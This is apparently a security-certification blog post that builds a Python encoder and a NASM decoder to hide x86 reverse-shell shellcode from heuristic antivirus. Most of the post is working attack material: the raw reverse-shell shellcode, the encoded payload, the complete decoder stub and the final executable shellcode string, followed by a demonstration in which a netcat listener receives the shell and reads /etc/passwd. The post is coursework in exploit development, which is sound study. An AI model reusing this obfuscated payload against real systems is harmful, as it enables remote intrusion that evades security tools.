# Shellcode Encoder & Decoder

<p style="text-align: justify;">Today we will deal with the process of creating an Encoder that will encode our "clean" shellcode with the help of Python, and then write Decoder using only NASM. Encoding is used to obfuscate the real purpose and function of shellcode so as to cheat security systems such as anti-virus programs running on heuristics. The main encoders used for the purpose are those based on XOR, NOR, substitution, insertion or other simple mathematical operations.
</p>
------------------------------------------------------------------------------------------------
### Encoder ###

<p style="text-align: justify;">Ours will be based in a way on some of them. It will be in order:</p>
- XOR using ROT13
- A pseudo-random number in the range 0-255, which the shellcode byte will be XORed, will be inserted "behind" it in the final, encoded shellcode (insertion).
- 2 bit shifted to the right

<p style="text-align: justify;">The decoder will rely on restoring the original "clean" shellcode, using operations completely opposite to those with which we encoded shellcode.</p>

<p style="text-align: justify;">Below is the full Encoders code. As shellcode we will use a reverse shell written in Assignment number 2, based on the execve-stack technique.</p>

```py
import random

# place for our final encoded shellcode
final = ""

# function which generates random integer from 1 to 255 for XOR-ing
def numForXor():
	randomInt = random.randint(1,255)
	return randomInt

# function which takes a byte and how much places to right shift and returns a correct value after that operation
def rightShift(val, rot):
	return ((val & 0xff) >> rot % 8 ) | (val << ( 8 - (rot % 8)) & 0xff)

shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80")

print "\n  /-----------------------------------------------/"
print " *  Advanced ROT13, XOR and Right Shift Encoder  *"
print "/-----------------------------------------------/"

print "\nStructure: {shellcode ROT13,Xor,Right Shift 2 randint result} {randint} {shellcode ROT13,Xor,Right Shift 2 randint result} {randint} [..] \n"
print "\t-----------------------------------------------------------------"
print "\t| Byte    \t    Operation\t         RandInt       \tResult  |"
print "\t-----------------------------------------------------------------"

# loop for every byte in shellcode
for x in bytearray(shellcode):
	chosen = numForXor()

	# In case of NULL Byte (it happens, when both same values are xored, e.g. 0x5 xor 0x5 = 0x00)
	if hex(x) == hex(chosen): 
		chosen = numForXor()
	
	print "\t| \\x%x\t     ROT13,Xor,Right Shift 2       \\x%x\t  =      \\x%x\t|" % (x, chosen, rightShift(((x+13) ^ chosen),2))

	x = rightShift(((x+13) ^ chosen), 2)
	# Appending byte from shellcode
	final = final + "\\x%02x" % x

	# Appending byte which was used for xoring
	final = final + "\\x%02x" % chosen

print "\t-----------------------------------------------------------------"
print "\nShellcode length: %s\n" % len(shellcode)

print "Python version of encoded shellcode: \n" + 100 * "-" + "\n%s " % final
print 100 * "-"


nasm = final.replace('\\x',',0x')

print "\nNASM version of encoded shellcode: \n" + 100 * "-" + "\n%s " % nasm[1:]
print 100 * "-"

# in case of \xaa\xaa in generated encoded shellcode (very, very low chance), which is our decoders "STOP DECODING" tag
if "\\xaa\\xaa" in final:
	print "WARNING! You are extremely unlucky, because there are 2x \xaa in the encoded shellcode, that serve as a decoding end marker in the decoder. I suggest you repeat the generation of encoded shellcode."

```
Example of use.
```sh
$ python encoder.py 

  /------------------------------------------------/
 *  ROT13, XOR and Right Shift Insertion Encoder  *
/------------------------------------------------/

Structure: {shellcode ROT13,Xor,Right Shift 2 randint result} {randint} {shellcode ROT13,Xor,Right Shift 2 randint result} {randint} [..] 

	-----------------------------------------------------------------
	| Byte    	    Operation	         RandInt       	Result  |
	-----------------------------------------------------------------
	| \x31	     ROT13,Xor,Right Shift 2       \x7f	  =      \x50	|
	| \xc0	     ROT13,Xor,Right Shift 2       \x97	  =      \x96	|
	| \x31	     ROT13,Xor,Right Shift 2       \x77	  =      \x52	|
	| \xdb	     ROT13,Xor,Right Shift 2       \x38	  =      \x34	|
	| \x31	     ROT13,Xor,Right Shift 2       \x32	  =      \x3	|
	| \xc9	     ROT13,Xor,Right Shift 2       \x52	  =      \x21	|
	| \x31	     ROT13,Xor,Right Shift 2       \x85	  =      \xee	|
	| \xd2	     ROT13,Xor,Right Shift 2       \xde	  =      \x40	|
	| \xb0	     ROT13,Xor,Right Shift 2       \x76	  =      \xf2	|
	| \x66	     ROT13,Xor,Right Shift 2       \x7a	  =      \x42	|
	| \xb3	     ROT13,Xor,Right Shift 2       \x75	  =      \x6d	|
	| \x1	     ROT13,Xor,Right Shift 2       \x27	  =      \x4a	|
	| \x31	     ROT13,Xor,Right Shift 2       \xe6	  =      \x36	|
	| \xf6	     ROT13,Xor,Right Shift 2       \xff	  =      \x3f	|
	| \x56	     ROT13,Xor,Right Shift 2       \x93	  =      \x3c	|
	| \x6a	     ROT13,Xor,Right Shift 2       \x7a	  =      \x43	|
	| \x1	     ROT13,Xor,Right Shift 2       \xbd	  =      \xec	|
	| \x6a	     ROT13,Xor,Right Shift 2       \x6c	  =      \xc6	|
	| \x2	     ROT13,Xor,Right Shift 2       \x63	  =      \x1b	|
	| \x89	     ROT13,Xor,Right Shift 2       \x40	  =      \xb5	|
	| \xe1	     ROT13,Xor,Right Shift 2       \x80	  =      \x9b	|
	| \xcd	     ROT13,Xor,Right Shift 2       \x47	  =      \x67	|
	| \x80	     ROT13,Xor,Right Shift 2       \xc7	  =      \x92	|
	| \x89	     ROT13,Xor,Right Shift 2       \xff	  =      \x5a	|
	| \xc2	     ROT13,Xor,Right Shift 2       \xa8	  =      \xd9	|
	| \xb0	     ROT13,Xor,Right Shift 2       \x7	  =      \xae	|
	| \x66	     ROT13,Xor,Right Shift 2       \x62	  =      \x44	|
	| \xb3	     ROT13,Xor,Right Shift 2       \xe7	  =      \xc9	|
	| \x3	     ROT13,Xor,Right Shift 2       \x99	  =      \x62	|
	| \x56	     ROT13,Xor,Right Shift 2       \xac	  =      \xf3	|
	| \xb9	     ROT13,Xor,Right Shift 2       \xef	  =      \x4a	|
	| \x84	     ROT13,Xor,Right Shift 2       \xcd	  =      \x17	|
	| \x5	     ROT13,Xor,Right Shift 2       \x44	  =      \x95	|
	| \x5	     ROT13,Xor,Right Shift 2       \x30	  =      \x88	|
	| \x6	     ROT13,Xor,Right Shift 2       \x4f	  =      \x17	|
	| \x81	     ROT13,Xor,Right Shift 2       \xe0	  =      \x9b	|
	| \xe9	     ROT13,Xor,Right Shift 2       \x57	  =      \x68	|
	| \x5	     ROT13,Xor,Right Shift 2       \x9e	  =      \x23	|
	| \x5	     ROT13,Xor,Right Shift 2       \x4	  =      \x85	|
	| \x5	     ROT13,Xor,Right Shift 2       \x3e	  =      \xb	|
	| \x5	     ROT13,Xor,Right Shift 2       \xa6	  =      \x2d	|
	| \x51	     ROT13,Xor,Right Shift 2       \x65	  =      \xce	|
	| \x66	     ROT13,Xor,Right Shift 2       \x52	  =      \x48	|
	| \x68	     ROT13,Xor,Right Shift 2       \x5c	  =      \x4a	|
	| \x11	     ROT13,Xor,Right Shift 2       \x96	  =      \x22	|
	| \x5c	     ROT13,Xor,Right Shift 2       \xf7	  =      \xa7	|
	| \x66	     ROT13,Xor,Right Shift 2       \x7c	  =      \xc3	|
	| \x6a	     ROT13,Xor,Right Shift 2       \xda	  =      \x6b	|
	| \x2	     ROT13,Xor,Right Shift 2       \x5c	  =      \xd4	|
	| \x89	     ROT13,Xor,Right Shift 2       \xd	  =      \xe6	|
	| \xe1	     ROT13,Xor,Right Shift 2       \x84	  =      \x9a	|
	| \x6a	     ROT13,Xor,Right Shift 2       \x8f	  =      \x3e	|
	| \x10	     ROT13,Xor,Right Shift 2       \x96	  =      \xe2	|
	| \x51	     ROT13,Xor,Right Shift 2       \x75	  =      \xca	|
	| \x52	     ROT13,Xor,Right Shift 2       \xa4	  =      \xfe	|
	| \x89	     ROT13,Xor,Right Shift 2       \x65	  =      \xfc	|
	| \xe1	     ROT13,Xor,Right Shift 2       \x23	  =      \x73	|
	| \xcd	     ROT13,Xor,Right Shift 2       \xaa	  =      \x1c	|
	| \x80	     ROT13,Xor,Right Shift 2       \x9e	  =      \xc4	|
	| \xb0	     ROT13,Xor,Right Shift 2       \x35	  =      \x22	|
	| \x3f	     ROT13,Xor,Right Shift 2       \xdb	  =      \xe5	|
	| \x89	     ROT13,Xor,Right Shift 2       \xf9	  =      \xdb	|
	| \xd3	     ROT13,Xor,Right Shift 2       \xa4	  =      \x11	|
	| \x31	     ROT13,Xor,Right Shift 2       \x82	  =      \x2f	|
	| \xc9	     ROT13,Xor,Right Shift 2       \x10	  =      \xb1	|
	| \xcd	     ROT13,Xor,Right Shift 2       \x83	  =      \x56	|
	| \x80	     ROT13,Xor,Right Shift 2       \x8b	  =      \x81	|
	| \xb0	     ROT13,Xor,Right Shift 2       \xa8	  =      \x45	|
	| \x3f	     ROT13,Xor,Right Shift 2       \x4f	  =      \xc0	|
	| \xb1	     ROT13,Xor,Right Shift 2       \x5	  =      \xee	|
	| \x1	     ROT13,Xor,Right Shift 2       \x34	  =      \x8e	|
	| \xcd	     ROT13,Xor,Right Shift 2       \xae	  =      \x1d	|
	| \x80	     ROT13,Xor,Right Shift 2       \x4b	  =      \xb1	|
	| \xb0	     ROT13,Xor,Right Shift 2       \x33	  =      \xa3	|
	| \x3f	     ROT13,Xor,Right Shift 2       \x51	  =      \x47	|
	| \xb1	     ROT13,Xor,Right Shift 2       \x44	  =      \xbe	|
	| \x2	     ROT13,Xor,Right Shift 2       \x8f	  =      \x20	|
	| \xcd	     ROT13,Xor,Right Shift 2       \xa0	  =      \x9e	|
	| \x80	     ROT13,Xor,Right Shift 2       \x2b	  =      \xa9	|
	| \xb0	     ROT13,Xor,Right Shift 2       \x80	  =      \x4f	|
	| \xb	     ROT13,Xor,Right Shift 2       \xe9	  =      \x7c	|
	| \x31	     ROT13,Xor,Right Shift 2       \x33	  =      \x43	|
	| \xf6	     ROT13,Xor,Right Shift 2       \xe9	  =      \xba	|
	| \x56	     ROT13,Xor,Right Shift 2       \xfe	  =      \x67	|
	| \x68	     ROT13,Xor,Right Shift 2       \x85	  =      \x3c	|
	| \x6e	     ROT13,Xor,Right Shift 2       \x35	  =      \x93	|
	| \x2f	     ROT13,Xor,Right Shift 2       \xc9	  =      \x7d	|
	| \x73	     ROT13,Xor,Right Shift 2       \x69	  =      \x7a	|
	| \x68	     ROT13,Xor,Right Shift 2       \xea	  =      \xe7	|
	| \x68	     ROT13,Xor,Right Shift 2       \x59	  =      \xb	|
	| \x2f	     ROT13,Xor,Right Shift 2       \x8e	  =      \xac	|
	| \x2f	     ROT13,Xor,Right Shift 2       \x97	  =      \xea	|
	| \x62	     ROT13,Xor,Right Shift 2       \xf9	  =      \xa5	|
	| \x69	     ROT13,Xor,Right Shift 2       \xfb	  =      \x63	|
	| \x89	     ROT13,Xor,Right Shift 2       \x3f	  =      \x6a	|
	| \xe3	     ROT13,Xor,Right Shift 2       \x44	  =      \x2d	|
	| \x31	     ROT13,Xor,Right Shift 2       \x7	  =      \x4e	|
	| \xc9	     ROT13,Xor,Right Shift 2       \x99	  =      \xd3	|
	| \x31	     ROT13,Xor,Right Shift 2       \x44	  =      \x9e	|
	| \xd2	     ROT13,Xor,Right Shift 2       \xb4	  =      \xda	|
	| \xcd	     ROT13,Xor,Right Shift 2       \xa	  =      \x34	|
	| \x80	     ROT13,Xor,Right Shift 2       \xe9	  =      \x19	|
	-----------------------------------------------------------------

Shellcode length: 102

Python version of encoded shellcode: 
----------------------------------------------------------------------------------------------------
\x50\x7f\x96\x97\x52\x77\x34\x38\x03\x32\x21\x52\xee\x85\x40\xde\xf2\x76\x42\x7a\x6d\x75\x4a\x27\x36\xe6\x3f\xff\x3c\x93\x43\x7a\xec\xbd\xc6\x6c\x1b\x63\xb5\x40\x9b\x80\x67\x47\x92\xc7\x5a\xff\xd9\xa8\xae\x07\x44\x62\xc9\xe7\x62\x99\xf3\xac\x4a\xef\x17\xcd\x95\x44\x88\x30\x17\x4f\x9b\xe0\x68\x57\x23\x9e\x85\x04\x0b\x3e\x2d\xa6\xce\x65\x48\x52\x4a\x5c\x22\x96\xa7\xf7\xc3\x7c\x6b\xda\xd4\x5c\xe6\x0d\x9a\x84\x3e\x8f\xe2\x96\xca\x75\xfe\xa4\xfc\x65\x73\x23\x1c\xaa\xc4\x9e\x22\x35\xe5\xdb\xdb\xf9\x11\xa4\x2f\x82\xb1\x10\x56\x83\x81\x8b\x45\xa8\xc0\x4f\xee\x05\x8e\x34\x1d\xae\xb1\x4b\xa3\x33\x47\x51\xbe\x44\x20\x8f\x9e\xa0\xa9\x2b\x4f\x80\x7c\xe9\x43\x33\xba\xe9\x67\xfe\x3c\x85\x93\x35\x7d\xc9\x7a\x69\xe7\xea\x0b\x59\xac\x8e\xea\x97\xa5\xf9\x63\xfb\x6a\x3f\x2d\x44\x4e\x07\xd3\x99\x9e\x44\xda\xb4\x34\x0a\x19\xe9 
----------------------------------------------------------------------------------------------------

NASM version of encoded shellcode: 
----------------------------------------------------------------------------------------------------
0x50,0x7f,0x96,0x97,0x52,0x77,0x34,0x38,0x03,0x32,0x21,0x52,0xee,0x85,0x40,0xde,0xf2,0x76,0x42,0x7a,0x6d,0x75,0x4a,0x27,0x36,0xe6,0x3f,0xff,0x3c,0x93,0x43,0x7a,0xec,0xbd,0xc6,0x6c,0x1b,0x63,0xb5,0x40,0x9b,0x80,0x67,0x47,0x92,0xc7,0x5a,0xff,0xd9,0xa8,0xae,0x07,0x44,0x62,0xc9,0xe7,0x62,0x99,0xf3,0xac,0x4a,0xef,0x17,0xcd,0x95,0x44,0x88,0x30,0x17,0x4f,0x9b,0xe0,0x68,0x57,0x23,0x9e,0x85,0x04,0x0b,0x3e,0x2d,0xa6,0xce,0x65,0x48,0x52,0x4a,0x5c,0x22,0x96,0xa7,0xf7,0xc3,0x7c,0x6b,0xda,0xd4,0x5c,0xe6,0x0d,0x9a,0x84,0x3e,0x8f,0xe2,0x96,0xca,0x75,0xfe,0xa4,0xfc,0x65,0x73,0x23,0x1c,0xaa,0xc4,0x9e,0x22,0x35,0xe5,0xdb,0xdb,0xf9,0x11,0xa4,0x2f,0x82,0xb1,0x10,0x56,0x83,0x81,0x8b,0x45,0xa8,0xc0,0x4f,0xee,0x05,0x8e,0x34,0x1d,0xae,0xb1,0x4b,0xa3,0x33,0x47,0x51,0xbe,0x44,0x20,0x8f,0x9e,0xa0,0xa9,0x2b,0x4f,0x80,0x7c,0xe9,0x43,0x33,0xba,0xe9,0x67,0xfe,0x3c,0x85,0x93,0x35,0x7d,0xc9,0x7a,0x69,0xe7,0xea,0x0b,0x59,0xac,0x8e,0xea,0x97,0xa5,0xf9,0x63,0xfb,0x6a,0x3f,0x2d,0x44,0x4e,0x07,0xd3,0x99,0x9e,0x44,0xda,0xb4,0x34,0x0a,0x19,0xe9 
----------------------------------------------------------------------------------------------------
```
------------------------------------------------------------------------------------------------
### Decoder ###

<p style="text-align: justify;">Using the encoded shellcode generated, below is the Decoder code, written in NASM, along with explanatory comments on each line.</p>

```nasm
; Filename: 	decoder.nasm
; Author:  	Jakub Heba
; Purpose:	SLAE Course & Exam


global _start
section .text write
_start:
        jmp short call_shellcode	; JMP-CALL-POP

decoder:
        pop esi				; Popping the shellcode variable content into ESI
        xor eax, eax			; clearing EAX
	mul ecx				; clearing ECX and EDX
        xor ebx, ebx			; clearing EBX
        mov bl, 0xaa			; our "STOP DECODING" tag

decode:
        mov al, byte [esi+edx]		; Moving byte from encoded shellcode into EAX. Becouse of incrementing of EDX, it will always be the encoded byte from original shellcode
	rol al, 2			; Left shift 2 (Inversely than in the encoder)
	xor al, byte [esi+edx+1]	; XOR-ing the selected byte with next one (garbage)
	sub al, 13			; Inversion of ROT-13 operation
	add dl, 2			; Incrementing the EDX by 2 (to jump over garbage)
	mov byte [esi+ecx],al		; Moving the decoded byte into correct space in ESI (shellcode)
	inc cl				; incrementing a counter that indicates next place for the decoded byte

        cmp bl, byte [esi+edx]		; Checking, that next byte contains \xaa (start of the "STOP DECODING" tag
        jnz decode			; If ZF is not set (values are different), JMP to the loop for next byte

        cmp bl, byte [esi+edx+1]	; Checking if the value of the second byte ahead is also \xaa, which will mean the occurrence of the tag and the end of decoding
        jnz decode			; If no (ZF not set) that means, that it was normal occurance of \xaa in the shellcode, so let's JMP to the loop for the next byte

        jmp short shellcode		; If yes (ZF set again) JMP to the shellcode and execute 

call_shellcode:
        call decoder
	shellcode: db 0x80,0x3c,0xbb,0x23,0x3b,0xd2,0x1e,0x90,0x28,0x9e,0x70,0x17,0x1f,0x42,0x0d,0xeb,0x34,0x6d,0x0a,0x5b,0x2b,0x6c,0xec,0xbd,0xab,0x90,0xd8,0x60,0x88,0x41,0xb2,0xbd,0xea,0xa5,0xd2,0x3c,0xff,0xf0,0x62,0x1f,0x80,0xec,0x44,0xcb,0x14,0xdd,0x81,0x90,0xff,0x30,0x08,0x9d,0x95,0x25,0xd2,0x8b,0xc8,0x33,0x73,0xae,0x8e,0xfc,0xaa,0x3b,0xbd,0xe4,0x26,0x8a,0x66,0x8a,0xf6,0x55,0x53,0xbb,0x44,0x03,0xd9,0x75,0x11,0x56,0x3a,0xfa,0x09,0x7a,0xef,0xcc,0x5e,0x0c,0x02,0x16,0xf9,0x8e,0xc9,0x54,0x21,0xf3,0xb4,0xdd,0x46,0x8f,0xe8,0x4d,0xd9,0x10,0x90,0x5f,0xbe,0xa4,0x6b,0xf2,0x3f,0x6a,0x97,0xb0,0x80,0xd8,0x34,0x5d,0xe6,0x26,0x50,0x0d,0x5f,0xeb,0xe6,0x7b,0xdd,0x49,0x53,0x9b,0x96,0x80,0x99,0xeb,0xf7,0x62,0x05,0x58,0xb0,0x7c,0x3d,0xfa,0x4f,0xe7,0x28,0x2d,0x1b,0xd1,0x1a,0x24,0xd7,0xe1,0x53,0x42,0xbc,0x28,0xcc,0xbe,0xe2,0x36,0x3d,0xec,0x56,0x67,0x9b,0x6d,0x1d,0x17,0xe5,0xe2,0xa2,0xf1,0x1c,0x4c,0x9e,0xfa,0x96,0x2f,0x97,0x2b,0x9c,0x4e,0x2d,0x88,0x63,0xe2,0xaf,0xc8,0xc3,0x99,0x9b,0x9e,0x1a,0x56,0x76,0x0f,0x79,0xdb,0x01,0xdb,0x70,0x1b,0x33,0x41,0xaa,0xaa
```
<p style="text-align: justify;">In this particular case, there is a small trap. Using the following command we can see that one line of code contains 7 opcodes, while we usually filtered only to a maximum of six. Only changing the syntax of the objdump command will allow you to successfully use shellcode (otherwise the last opcode will be skipped).</p>

```sh
$ objdump -d decoder -M intel

[..]
80480b1:	ea a5 d2 3c ff f0 62 	jmp    0x62f0:0xff3cd2a5
80480b8:	1f                   	pop    ds
80480b9:	80 ec 44             	sub    ah,0x44
80480bc:	cb                   	retf   
80480bd:	14 dd                	adc    al,0xdd
80480bf:	81 90 ff 30 08 9d 95 	adc    DWORD PTR [eax-0x62f7cf01],0x8bd22595
[..]
```
<p style="text-align: justify;">We compile, link, and put the result of the objdump command in a wrapper written in C.</p>

```sh
$ ./compile.sh decoder
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!

$ objdump -d ./decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xeb\x2a\x5e\x31\xc0\xf7\xe1\x31\xdb\xb3\xaa\x8a\x04\x16\xc0\xc0\x02\x32\x44\x16\x01\x2c\x0d\x80\xc2\x02\x88\x04\x0e\xfe\xc1\x3a\x1c\x16\x75\xe7\x3a\x5c\x16\x01\x75\xe1\xeb\x05\xe8\xd1\xff\xff\xff\x80\x3c\xbb\x23\x3b\xd2\x1e\x90\x28\x9e\x70\x17\x1f\x42\x0d\xeb\x34\x6d\x0a\x5b\x2b\x6c\xec\xbd\xab\x90\xd8\x60\x88\x41\xb2\xbd\xea\xa5\xd2\x3c\xff\xf0\x62\x1f\x80\xec\x44\xcb\x14\xdd\x81\x90\xff\x30\x08\x9d\x95\x25\xd2\x8b\xc8\x33\x73\xae\x8e\xfc\xaa\x3b\xbd\xe4\x26\x8a\x66\x8a\xf6\x55\x53\xbb\x44\x03\xd9\x75\x11\x56\x3a\xfa\x09\x7a\xef\xcc\x5e\x0c\x02\x16\xf9\x8e\xc9\x54\x21\xf3\xb4\xdd\x46\x8f\xe8\x4d\xd9\x10\x90\x5f\xbe\xa4\x6b\xf2\x3f\x6a\x97\xb0\x80\xd8\x34\x5d\xe6\x26\x50\x0d\x5f\xeb\xe6\x7b\xdd\x49\x53\x9b\x96\x80\x99\xeb\xf7\x62\x05\x58\xb0\x7c\x3d\xfa\x4f\xe7\x28\x2d\x1b\xd1\x1a\x24\xd7\xe1\x53\x42\xbc\x28\xcc\xbe\xe2\x36\x3d\xec\x56\x67\x9b\x6d\x1d\x17\xe5\xe2\xa2\xf1\x1c\x4c\x9e\xfa\x96\x2f\x97\x2b\x9c\x4e\x2d\x88\x63\xe2\xaf\xc8\xc3\x99\x9b\x9e\x1a\x56\x76\x0f\x79\xdb\x01\xdb\x70\x1b\x33\x41\xaa\xaa"
```
We compile and execute.
```sh
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode 
Shellcode Length:  255
```
Second terminal:
```sh
$ nc -nvlp 4444

Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 45799)
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
[..]
```
### Pwned. ###

-----------------------------------------------------------------------------
-----------------------------------------------------------------------------

<p style="text-align: justify;">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: https://www.pentesteracademy.com/course?id=3</p>

Student ID: SLAE-1524

-----------------------------------------------------------------------------
-----------------------------------------------------------------------------
